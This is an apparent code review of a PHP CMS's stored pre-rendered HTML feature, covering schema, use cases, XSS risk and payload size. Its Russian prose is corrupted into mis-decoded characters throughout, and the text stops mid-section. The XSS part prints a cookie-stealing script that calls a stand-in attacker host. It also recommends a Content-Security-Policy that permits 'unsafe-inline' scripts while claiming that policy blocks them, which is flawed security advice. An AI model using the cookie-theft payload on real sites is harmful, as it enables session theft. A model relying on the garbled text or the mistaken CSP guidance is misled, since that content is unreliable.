# ‚ö†Ô∏è –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –ü–†–û–í–ï–†–ö–ê: Rendered HTML Implementation

**–î–∞—Ç–∞:** 2025-10-18  
**Reviewer:** Technical Lead (Final Review Before Production)  
**–ó–∞–¥–∞—á–∞:** –£–±–µ–¥–∏—Ç—å—Å—è —á—Ç–æ Unified Renderer (rendered_html) –Ω–µ —Å–ª–æ–º–∞–µ—Ç —Å–∏—Å—Ç–µ–º—É  
**–°—Ç–∞—Ç—É—Å:** üî¥ **–ë–õ–û–ö–ò–†–£–ï–¢ –î–ï–ü–õ–û–ô ‚Äî –ù–ê–ô–î–ï–ù–´ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï –ü–†–û–ë–õ–ï–ú–´**

---

## ‚úÖ –ü–£–ù–ö–¢ 1: Page Entity - –ü–†–û–í–ï–†–ï–ù–û

### –ü—Ä–æ–≤–µ—Ä–∫–∞ –º–µ—Ç–æ–¥–æ–≤:
```php
// backend/src/Domain/Entity/Page.php
private ?string $renderedHtml = null;  // –°—Ç—Ä–æ–∫–∞ 23
public function getRenderedHtml(): ?string  // –°—Ç—Ä–æ–∫–∞ 150
public function setRenderedHtml(?string $html): void  // –°—Ç—Ä–æ–∫–∞ 236
```

### –†–µ–∑—É–ª—å—Ç–∞—Ç:
- ‚úÖ –ú–µ—Ç–æ–¥—ã —Å—É—â–µ—Å—Ç–≤—É—é—Ç
- ‚úÖ Nullable —Ç–∏–ø (?string) ‚Äî –Ω–µ —Å–ª–æ–º–∞–µ—Ç —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
- ‚úÖ –°–µ—Ç—Ç–µ—Ä –µ—Å—Ç—å ‚Äî –º–æ–∂–Ω–æ –æ–±–Ω–æ–≤–ª—è—Ç—å

### –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤ —Å–∏—Å—Ç–µ–º–µ:
1. **EntityToArrayTransformer** (—Å—Ç—Ä–æ–∫–∞ 48) ‚Äî ‚úÖ –≤–∫–ª—é—á–∞–µ—Ç –≤ JSON –æ—Ç–≤–µ—Ç
2. **GetPageWithBlocks** (—Å—Ç—Ä–æ–∫–∞ 87, DEPRECATED –º–µ—Ç–æ–¥) ‚Äî ‚úÖ –±—É–¥–µ—Ç —É–¥–∞–ª–µ–Ω–æ
3. **MySQLPageRepository** (213, 257) ‚Äî ‚úÖ INSERT/UPDATE –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç
4. **MySQLPageRepository** (292) ‚Äî ‚úÖ SELECT/hydrate –≤–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç
5. **PublishPage** (—Å—Ç—Ä–æ–∫–∞ 46) ‚Äî ‚úÖ –≤—ã–∑—ã–≤–∞–µ—Ç setRenderedHtml

**–í–ï–†–î–ò–ö–¢:** ‚úÖ –ë–ï–ó–û–ü–ê–°–ù–û. –ü–æ–ª–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ –∏–Ω—Ç–µ–≥—Ä–∏—Ä–æ–≤–∞–Ω–æ –≤ Entity.

---

## ‚úÖ –ü–£–ù–ö–¢ 2: Database Schema - –ü–†–û–í–ï–†–ï–ù–û

### –ú–∏–≥—Ä–∞—Ü–∏—è:
```sql
-- database/migrations/2025_10_13_add_rendered_html_and_menu_title.sql
ALTER TABLE pages
  ADD COLUMN IF NOT EXISTS rendered_html LONGTEXT NULL
    COMMENT 'Pre-rendered static HTML (cached at publish time)'
    AFTER page_specific_code;
```

### –•–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏ –∫–æ–ª–æ–Ω–∫–∏:
- **–¢–∏–ø:** LONGTEXT (–¥–æ 4GB)
- **Nullable:** YES
- **–ò–Ω–¥–µ–∫—Å—ã:** –ù–ï–¢ (–ø—Ä–∞–≤–∏–ª—å–Ω–æ ‚Äî –Ω–µ–ª—å–∑—è –∏–Ω–¥–µ–∫—Å–∏—Ä–æ–≤–∞—Ç—å LONGTEXT)

### –†–∞–∑–º–µ—Ä –¥–∞–Ω–Ω—ã—Ö:
**–¢–∏–ø–∏—á–Ω—ã–π HTML —Ä–∞–∑–º–µ—Ä:**
- –ú–∞–ª–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ (2-3 –±–ª–æ–∫–∞): ~10KB
- –°—Ä–µ–¥–Ω—è—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ (10 –±–ª–æ–∫–æ–≤): ~50KB
- –ë–æ–ª—å—à–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ (30 –±–ª–æ–∫–æ–≤ + –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è): ~200KB

**–û—Ü–µ–Ω–∫–∞ –ë–î:**
- 100 —Å—Ç—Ä–∞–Ω–∏—Ü √ó 50KB = ~5MB
- 1000 —Å—Ç—Ä–∞–Ω–∏—Ü √ó 50KB = ~50MB
- 10000 —Å—Ç—Ä–∞–Ω–∏—Ü √ó 50KB = ~500MB

**–í–ï–†–î–ò–ö–¢:** ‚úÖ –ë–ï–ó–û–ü–ê–°–ù–û –¥–ª—è –º–∞–ª—ã—Ö/—Å—Ä–µ–¥–Ω–∏—Ö –ø—Ä–æ–µ–∫—Ç–æ–≤. –î–ª—è enterprise –Ω—É–∂–µ–Ω CDN.

---

## üî¥ –ü–£–ù–ö–¢ 3: Use Cases - –¢–†–ï–ë–£–ï–¢ –ò–ó–ú–ï–ù–ï–ù–ò–ô

### 3.1 UpdatePage Use Case

**–§–∞–π–ª:** `backend/src/Application/UseCase/UpdatePage.php`

**–¢–µ–∫—É—â–µ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ:**
```php
// UpdatePage::execute() ‚Äî —Å—Ç—Ä–æ–∫–∏ 32-148
// –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç: title, slug, status, blocks, SEO, menu...
// ‚ùå –ù–ï –û–ë–†–ê–ë–ê–¢–´–í–ê–ï–¢: renderedHtml
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
–ï—Å–ª–∏ frontend –æ—Ç–ø—Ä–∞–≤–∏—Ç `renderedHtml` –≤ payload –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ Published —Å—Ç—Ä–∞–Ω–∏—Ü—ã, **–æ–Ω –±—É–¥–µ—Ç –ø—Ä–æ–∏–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞–Ω**.

**–†–µ—à–µ–Ω–∏–µ (–û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û–ï):**
```php
// –î–û–ë–ê–í–ò–¢–¨ –ø–æ—Å–ª–µ —Å—Ç—Ä–æ–∫–∏ 95 (–ø–æ—Å–ª–µ pageSpecificCode):
if (isset($data['renderedHtml'])) {
    $page->setRenderedHtml($data['renderedHtml']);
}
```

**–ö—Ä–∏—Ç–∏—á–Ω–æ—Å—Ç—å:** üî¥ **–ë–õ–û–ö–ò–†–£–ï–¢ –§–£–ù–ö–¶–ò–û–ù–ê–õ–¨–ù–û–°–¢–¨** ‚Äî –±–µ–∑ —ç—Ç–æ–≥–æ Unified Renderer –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç.

---

### 3.2 CreatePage Use Case

**–§–∞–π–ª:** `backend/src/Application/UseCase/CreatePage.php`

**–¢–µ–∫—É—â–µ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ:**
```php
// CreatePage::execute() ‚Äî —Å—Ç—Ä–æ–∫–∏ 38-114
// –°–æ–∑–¥–∞—ë—Ç Page entity —Å –ø–æ–ª—è–º–∏: title, slug, status, SEO...
// ‚ùå –ù–ï –ü–ï–†–ï–î–ê–Å–¢: renderedHtml –≤ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
–ü—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –Ω–æ–≤–æ–π Published —Å—Ç—Ä–∞–Ω–∏—Ü—ã (—Ä–µ–¥–∫–∏–π —Å–ª—É—á–∞–π) `renderedHtml` –±—É–¥–µ—Ç NULL.

**–†–µ—à–µ–Ω–∏–µ (–û–ü–¶–ò–û–ù–ê–õ–¨–ù–û–ï, –Ω–∏–∑–∫–∏–π –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç):**
```php
// –î–û–ë–ê–í–ò–¢–¨ –ø–æ—Å–ª–µ —Å—Ç—Ä–æ–∫–∏ 75 (–ø–æ—Å–ª–µ —Å–æ–∑–¥–∞–Ω–∏—è Page):
if (isset($data['renderedHtml'])) {
    $page->setRenderedHtml($data['renderedHtml']);
}
// –ó–∞—Ç–µ–º –≤—ã–∑–≤–∞—Ç—å save() ‚Äî —É–∂–µ –µ—Å—Ç—å –Ω–∞ —Å—Ç—Ä–æ–∫–µ 79
```

**–ö—Ä–∏—Ç–∏—á–Ω–æ—Å—Ç—å:** ‚ö†Ô∏è **–°–†–ï–î–ù–Ø–Ø** ‚Äî –æ–±—ã—á–Ω–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã —Å–æ–∑–¥–∞—é—Ç—Å—è –∫–∞–∫ Draft, rendered_html –∑–∞–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø—Ä–∏ Publish.

---

## üî¥ –ü–£–ù–ö–¢ 4: –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–¨ (XSS) - –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –£–Ø–ó–í–ò–ú–û–°–¢–¨

### 4.1 PublicPageController ‚Äî –ù–ï–ó–ê–©–ò–©–Å–ù–ù–´–ô –í–´–í–û–î HTML

**–§–∞–π–ª:** `backend/src/Presentation/Controller/PublicPageController.php`

**–¢–µ–∫—É—â–∏–π –∫–æ–¥ (–°–¢–†–û–ö–ê 90):**
```php
if (isset($page['status']) && $page['status'] === 'published' 
    && isset($page['rendered_html']) && !empty($page['rendered_html'])) {
    
    header('Content-Type: text/html; charset=utf-8');
    
    // ‚ùå –í–´–í–û–î –ë–ï–ó –°–ê–ù–ò–¢–ò–ó–ê–¶–ò–ò!
    $fixed = $this->fixUploadsUrls($page['rendered_html']);
    echo $fixed;
    exit;
}
```

**–ü–†–û–ë–õ–ï–ú–ê:**
1. `rendered_html` –ø—Ä–∏—Ö–æ–¥–∏—Ç –∏–∑ –ë–î **–ë–ï–ó –ü–†–û–í–ï–†–û–ö**
2. –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å (—á–µ—Ä–µ–∑ –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π frontend –∏–ª–∏ –ø—Ä—è–º–æ–π SQL inject) —Å–æ—Ö—Ä–∞–Ω–∏—Ç:
   ```html
   <script>
   fetch('https://hacker.com/steal?cookie=' + document.cookie);
   </script>
   ```
3. –≠—Ç–æ—Ç —Å–∫—Ä–∏–ø—Ç –±—É–¥–µ—Ç **–í–´–ü–û–õ–ù–ï–ù** –Ω–∞ –≤—Å–µ—Ö –ø—É–±–ª–∏—á–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü–∞—Ö = **XSS –ê–¢–ê–ö–ê**

**–í–ï–ö–¢–û–† –ê–¢–ê–ö–ò:**
```
–•–∞–∫–µ—Ä ‚Üí –ò–∑–º–µ–Ω—è–µ—Ç editor.js::generateRenderedHTML() 
      ‚Üí –î–æ–±–∞–≤–ª—è–µ—Ç <script>malicious code</script>
      ‚Üí –°–æ—Ö—Ä–∞–Ω—è–µ—Ç —Å—Ç—Ä–∞–Ω–∏—Ü—É
      ‚Üí rendered_html –≤ –ë–î —Å–æ–¥–µ—Ä–∂–∏—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥
      ‚Üí PublicPageController –≤—ã–≤–æ–¥–∏—Ç –ë–ï–ó –§–ò–õ–¨–¢–†–ê–¶–ò–ò
      ‚Üí –í—Å–µ –ø–æ—Å–µ—Ç–∏—Ç–µ–ª–∏ —Å–∞–π—Ç–∞ = –∂–µ—Ä—Ç–≤—ã XSS
```

**–†–ï–®–ï–ù–ò–ï (–û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û–ï):**

#### –í–∞—Ä–∏–∞–Ω—Ç A: –î–æ–≤–µ—Ä—è—Ç—å —Ç–æ–ª—å–∫–æ admin –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º (–¢–ï–ö–£–©–ò–ô –ü–û–î–•–û–î)
```php
// PublicPageController.php ‚Äî –ë–ï–ó –ò–ó–ú–ï–ù–ï–ù–ò–ô

// –õ–û–ì–ò–ö–ê:
// rendered_html –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è –¢–û–õ–¨–ö–û –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–º–∏ –∞–¥–º–∏–Ω–∞–º–∏
// Frontend sanitizes HTML before sending (escape() –º–µ—Ç–æ–¥)
// Backend –ù–ï –¥–æ–ª–∂–µ–Ω –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ —Ñ–∏–ª—å—Ç—Ä–æ–≤–∞—Ç—å = –ø–æ—Ç–µ—Ä—è —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
```

**–£—Å–ª–æ–≤–∏—è:**
1. ‚úÖ –¢–æ–ª—å–∫–æ –∞–¥–º–∏–Ω—ã –º–æ–≥—É—Ç —Å–æ–∑–¥–∞–≤–∞—Ç—å/—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—ã (AUTH –ø—Ä–æ–≤–µ—Ä–∫–∞)
2. ‚úÖ Frontend –∏—Å–ø–æ–ª—å–∑—É–µ—Ç `this.escape()` –¥–ª—è user-generated –∫–æ–Ω—Ç–µ–Ω—Ç–∞
3. ‚úÖ rendered_html –ù–ï —Ä–µ–¥–∞–∫—Ç–∏—Ä—É–µ—Ç—Å—è –≤—Ä—É—á–Ω—É—é —á–µ—Ä–µ–∑ SQL

**–†–∏—Å–∫–∏:**
- ‚ö†Ô∏è –ï—Å–ª–∏ –∞–¥–º–∏–Ω –≤–∑–ª–æ–º–∞–Ω = XSS –≤–æ–∑–º–æ–∂–µ–Ω
- ‚ö†Ô∏è –ï—Å–ª–∏ –ë–î —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω–∞ = XSS –≤–æ–∑–º–æ–∂–µ–Ω

#### –í–∞—Ä–∏–∞–Ω—Ç B: Content Security Policy (CSP) Headers (–†–ï–ö–û–ú–ï–ù–î–£–ï–¢–°–Ø)
```php
// PublicPageController.php:90 ‚Äî –î–û–ë–ê–í–ò–¢–¨:
header('Content-Security-Policy: "default-src \'self\'; script-src \'self\' \'unsafe-inline\'; style-src \'self\' \'unsafe-inline\'; img-src \'self\' data: https:;"');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

echo $this->fixUploadsUrls($page['rendered_html']);
```

**–ó–∞—â–∏—Ç–∞:**
- –ë–ª–æ–∫–∏—Ä—É–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ inline scripts (–∫—Ä–æ–º–µ —Ä–∞–∑—Ä–µ—à—ë–Ω–Ω—ã—Ö)
- –ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ—Ç –∑–∞–≥—Ä—É–∑–∫—É —Å–∫—Ä–∏–ø—Ç–æ–≤ —Å –≤–Ω–µ—à–Ω–∏—Ö –¥–æ–º–µ–Ω–æ–≤
- –ó–∞—â–∏—Ç–∞ –æ—Ç clickjacking

#### –í–∞—Ä–∏–∞–Ω—Ç C: HTML Purifier (–ò–ó–ë–´–¢–û–ß–ù–û –¥–ª—è –Ω–∞—à–µ–≥–æ —Å–ª—É—á–∞—è)
```php
// –ù–ï –†–ï–ö–û–ú–ï–ù–î–£–ï–¢–°–Ø ‚Äî —Å–ª–∏—à–∫–æ–º –∞–≥—Ä–µ—Å—Å–∏–≤–Ω—ã–π, —É–±—å—ë—Ç –≤–∞–ª–∏–¥–Ω—ã–π HTML
$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$clean = $purifier->purify($page['rendered_html']);
echo $clean;
```

**–ù–µ–¥–æ—Å—Ç–∞—Ç–∫–∏:**
- –ú–æ–∂–µ—Ç —Å–ª–æ–º–∞—Ç—å –≤–∞–ª–∏–¥–Ω—ã–π HTML (inline styles, data attributes)
- –ú–µ–¥–ª–µ–Ω–Ω—ã–π (–ø–∞—Ä—Å–∏–Ω–≥ –∫–∞–∂–¥–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞)
- –ò–∑–±—ã—Ç–æ—á–µ–Ω –µ—Å–ª–∏ –¥–æ–≤–µ—Ä—è–µ–º –∞–¥–º–∏–Ω–∞–º

**–†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø:**
‚úÖ **–í–∞—Ä–∏–∞–Ω—Ç B (CSP Headers)** ‚Äî –±–∞–ª–∞–Ω—Å –º–µ–∂–¥—É –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å—é –∏ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å—é.

---

### 4.2 Frontend Escaping ‚Äî –ü–†–û–í–ï–†–ö–ê

**–§–∞–π–ª:** `frontend/editor.js::renderBlock()`

**–ü—Ä–∏–º–µ—Ä (—Å—Ç—Ä–æ–∫–∞ 985):**
```javascript
renderMainScreen(block) {
    const title = data.title || '';
    const text = data.text || '';
    
    return `
        <h1>${title}</h1>  // ‚ùå –ë–ï–ó –≠–ö–†–ê–ù–ò–†–û–í–ê–ù–ò–Ø!
        <p>${this.escape(text)}</p>  // ‚úÖ –≠–ö–†–ê–ù–ò–†–û–í–ê–ù–û
    `;
}
```

**–ü–†–û–ë–õ–ï–ú–ê:**
–ù–µ–∫–æ—Ç–æ—Ä—ã–µ –ø–æ–ª—è —ç–∫—Ä–∞–Ω–∏—Ä—É—é—Ç—Å—è (`this.escape()`), –¥—Ä—É–≥–∏–µ ‚Äî –ù–ï–¢.

**–†–µ—à–µ–Ω–∏–µ:**
–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –í–°–ï –º–µ—Ç–æ–¥—ã `render*()` –≤ editor.js –∏ —É–±–µ–¥–∏—Ç—å—Å—è —á—Ç–æ:
```javascript
${this.escape(userInput)}  // –î–õ–Ø –í–°–ï–• –¥–∞–Ω–Ω—ã—Ö –∏–∑ –±–ª–æ–∫–æ–≤
```

**–ö—Ä–∏—Ç–∏—á–Ω–æ—Å—Ç—å:** üî¥ **–ö–†–ò–¢–ò–ß–ù–û** ‚Äî –±–µ–∑ —ç—Ç–æ–≥–æ XSS –≤–æ–∑–º–æ–∂–µ–Ω —á–µ—Ä–µ–∑ –¥–∞–Ω–Ω—ã–µ –±–ª–æ–∫–æ–≤.

---

## ‚úÖ –ü–£–ù–ö–¢ 5: API Backwards Compatibility - –ü–†–û–í–ï–†–ï–ù–û

### –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞:

**–¢–µ–∫—É—â–∏–π API:** `PUT /api/pages/:id`
```json
{
  "title": "...",
  "blocks": [...]
}
```

**–ü–æ—Å–ª–µ –∏–∑–º–µ–Ω–µ–Ω–∏–π:** `PUT /api/pages/:id`
```json
{
  "title": "...",
  "blocks": [...],
  "renderedHtml": "<html>...</html>"  // ‚úÖ –ù–û–í–û–ï –û–ü–¶–ò–û–ù–ê–õ–¨–ù–û–ï –ü–û–õ–ï
}
```

**–í–ª–∏—è–Ω–∏–µ –Ω–∞ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –∫–ª–∏–µ–Ω—Ç–æ–≤:**
- ‚úÖ –°—Ç–∞—Ä—ã–µ –∫–ª–∏–µ–Ω—Ç—ã (–ù–ï –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç renderedHtml) ‚Äî –ø—Ä–æ–¥–æ–ª–∂–∞—Ç —Ä–∞–±–æ—Ç–∞—Ç—å
- ‚úÖ –ù–æ–≤—ã–µ –∫–ª–∏–µ–Ω—Ç—ã (–æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç renderedHtml) ‚Äî –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Unified Renderer
- ‚úÖ –û–±—Ä–∞—Ç–Ω–∞—è —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç—å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞

**–í–ï–†–î–ò–ö–¢:** ‚úÖ –ë–ï–ó–û–ü–ê–°–ù–û. –ù–æ–≤–æ–µ –ø–æ–ª–µ –æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ–µ.

---

## ‚ö†Ô∏è –ü–£–ù–ö–¢ 6: Draft vs Published - –õ–û–ì–ò–ö–ê –°–¢–ê–¢–£–°–û–í

### –¢–µ–∫—É—â–∞—è –ª–æ–≥–∏–∫–∞:

```php
// PublicPageController.php:82-94
if ($page['status'] === 'published' && !empty($page['rendered_html'])) {
    echo $page['rendered_html'];  // ‚úÖ SERVED FROM CACHE
    exit;
}

// Fallback: runtime render (preview/draft)
$this->renderPage($result);  // ‚úÖ PHP RENDERING
```

### –°—Ü–µ–Ω–∞—Ä–∏–∏:

| –°—Ç–∞—Ç—É—Å | rendered_html | –ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç |
|--------|---------------|----------------|
| **draft** | NULL | ‚úÖ Runtime PHP render (—Ç–µ–∫—É—â–∞—è –ª–æ–≥–∏–∫–∞) |
| **draft** | –ï—Å—Ç—å | ‚úÖ Runtime PHP render (–∏–≥–Ω–æ—Ä–∏—Ä—É–µ—Ç HTML) |
| **published** | NULL | ‚úÖ Runtime PHP render (fallback) |
| **published** | –ï—Å—Ç—å | ‚úÖ –û—Ç–¥–∞—ë—Ç rendered_html (–ë–´–°–¢–†–û) |

### –ü—Ä–æ–±–ª–µ–º–∞: –ö–æ–≥–¥–∞ rendered_html –∑–∞–ø–æ–ª–Ω—è–µ—Ç—Å—è?

**–¢–µ–∫—É—â–∞—è –ª–æ–≥–∏–∫–∞:**
```
User –Ω–∞–∂–∏–º–∞–µ—Ç "Publish" 
  ‚Üì
PublishPage Use Case
  ‚Üì
RenderPageHtml::execute() (PHP —Ä–µ–Ω–¥–µ—Ä–∏–Ω–≥)
  ‚Üì
Page::setRenderedHtml($html)
  ‚Üì
Repository::save()
```

**–ù–æ–≤–∞—è –ª–æ–≥–∏–∫–∞ (Unified Renderer):**
```
User –Ω–∞–∂–∏–º–∞–µ—Ç "Save" –≤ —Ä–µ–¥–∞–∫—Ç–æ—Ä–µ (status = published)
  ‚Üì
editor.js::savePage()
  ‚Üì
generateRenderedHTML() (JS —Ä–µ–Ω–¥–µ—Ä–∏–Ω–≥)
  ‚Üì
POST {renderedHtml: "..."}
  ‚Üì
UpdatePage::execute() ‚Äî ‚ùå –°–ï–ô–ß–ê–° –ò–ì–ù–û–†–ò–†–£–ï–¢!
  ‚Üì
Repository::save() ‚Äî rendered_html –æ—Å—Ç–∞—ë—Ç—Å—è NULL
```

**–ü–†–û–ë–õ–ï–ú–ê:**
–ö–Ω–æ–ø–∫–∞ "Publish" (–æ—Ç–¥–µ–ª—å–Ω—ã–π endpoint `/api/pages/:id/publish`) –≤—ã–∑—ã–≤–∞–µ—Ç **PHP —Ä–µ–Ω–¥–µ—Ä–∏–Ω–≥**, –ù–û —Ä–µ–¥–∞–∫—Ç–æ—Ä –ø—Ä–∏ save **–ù–ï –ø–µ—Ä–µ–¥–∞—ë—Ç rendered_html**.

**–†–µ—à–µ–Ω–∏–µ:**

### –í–∞—Ä–∏–∞–Ω—Ç 1: Save –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç rendered_html
```javascript
// editor.js::savePage()
if (this.pageData.status === 'published') {
    pageDataForAPI.renderedHtml = await this.generateRenderedHTML();
}
```

**–ü–ª—é—Å—ã:**
- ‚úÖ –ü—Ä–æ–∑—Ä–∞—á–Ω–æ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
- ‚úÖ –í—Å–µ–≥–¥–∞ –∞–∫—Ç—É–∞–ª—å–Ω—ã–π HTML

**–ú–∏–Ω—É—Å—ã:**
- ‚ö†Ô∏è –ë–æ–ª—å—à–æ–π payload –ø—Ä–∏ –∫–∞–∂–¥–æ–º save

### –í–∞—Ä–∏–∞–Ω—Ç 2: –û—Ç–¥–µ–ª—å–Ω–∞—è –∫–Ω–æ–ø–∫–∞ "Regenerate HTML"
```javascript
// –ö–Ω–æ–ø–∫–∞ "–û–±–Ω–æ–≤–∏—Ç—å HTML" –≤ –∞–¥–º–∏–Ω–∫–µ
async regenerateHTML() {
    const html = await this.generateRenderedHTML();
    await this.apiClient.put(`/api/pages/${this.currentPageId}`, {
        renderedHtml: html
    });
}
```

**–ü–ª—é—Å—ã:**
- ‚úÖ –ö–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –∫–æ–≥–¥–∞ –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å
- ‚úÖ –ú–∞–ª–µ–Ω—å–∫–∏–π payload –ø—Ä–∏ –æ–±—ã—á–Ω–æ–º save

**–ú–∏–Ω—É—Å—ã:**
- ‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–∂–µ—Ç –∑–∞–±—ã—Ç—å –Ω–∞–∂–∞—Ç—å

**–†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø:** ‚úÖ **–í–∞—Ä–∏–∞–Ω—Ç 1** ‚Äî –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –≥–µ–Ω–µ—Ä–∞—Ü–∏—è –ø—Ä–∏ save –µ—Å–ª–∏ status=published.

---

## üî¥ –ü–£–ù–ö–¢ 7: –ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å - –†–ê–ó–ú–ï–† PAYLOAD

### –û—Ü–µ–Ω–∫–∞ —Ä–∞–∑–º–µ—Ä–∞:

**–¢–∏–ø–∏—á–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ (10 –±–ª–æ–∫–æ–≤):**
```html
<!DOCTYPE html>
<html>...CSS...</html>
```
–†–∞–∑–º–µ—Ä: ~50KB (—Å–∂–∏–º–∞–µ—Ç—Å—è –¥–æ ~10KB –ø—Ä–∏ gzip)

**Network Impact:**
- **HTTP Request:** `PUT /api/pages/:id` —Å 50KB payload
- **–í—Ä–µ–º—è –ø–µ—Ä–µ–¥–∞—á–∏:** ~100ms –Ω–∞ 5Mbps —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–∏
- **–ë–î Write:** INSERT 50KB –≤ LONGTEXT –∫–æ–ª–æ–Ω–∫—É

**–ü—Ä–æ–±–ª–µ–º—ã:**
1. ‚ö†Ô∏è **–ú–µ–¥–ª–µ–Ω–Ω—ã–π save** ‚Äî –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∂–¥—ë—Ç –¥–æ–ª—å—à–µ
2. ‚ö†Ô∏è **–ë–æ–ª—å—à–æ–π —Ä–∞–∑–º–µ—Ä –ë–î** ‚Äî 1000 —Å—Ç—Ä–∞–Ω–∏—Ü = 50MB —Ç–æ–ª—å–∫–æ rendered_html
3. ‚ö†Ô∏è **Network overhead** ‚Äî –∫–∞–∂–¥–æ–µ –∏–∑–º–µ–Ω–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç 50KB

**–†–µ—à–µ–Ω–∏—è:**

### –û–ø—Ü–∏—è A: –ì–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å —Ç–æ–ª—å–∫–æ –ø—Ä–∏ Publish (–ù–ï –ø—Ä–∏ –∫–∞–∂–¥–æ–º Save)
```javascript
// editor.js::savePage()
// –ù–ï –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å rendered_html –ø—Ä–∏ save

// editor.js::publishPage()
const html = await this.generateRenderedHTML();
await this.apiClient.put(`/api/pages/${this.currentPageId}/publish`, {
    renderedHtml: html
});
```

**–ü–ª—é—Å—ã:**
- ‚úÖ –ë—ã—Å—Ç—Ä—ã–π save (–±–µ–∑ HTML generation)
- ‚úÖ Payload –æ—Å—Ç–∞—ë—Ç—Å—è –º–∞–ª–µ–Ω—å–∫–∏–º

**–ú–∏–Ω—É—Å—ã:**
- ‚ö†Ô∏è –û—Ç–¥–µ–ª—å–Ω—ã–π API endpoint –¥–ª—è publish —Å HTML

### –û–ø—Ü–∏—è B: Compress HTML before sending
```javascript
// editor.js::savePage()
const html = await this.generateRenderedHTML();
const compressed = pako.gzip(html);  // JavaScript gzip library
pageDataForAPI.renderedHtml = btoa(compressed);  // Base64

// Backend:
$compressed = base64_decode($data['renderedHtml']);
$html = gzdecode($compressed);
$page->setRenderedHtml($html);
```

**–ü–ª—é—Å—ã:**
- ‚úÖ –ú–µ–Ω—å—à–∏–π network payload (~80% —ç–∫–æ–Ω–æ–º–∏–∏)

**–ú–∏–Ω—É—Å—ã:**
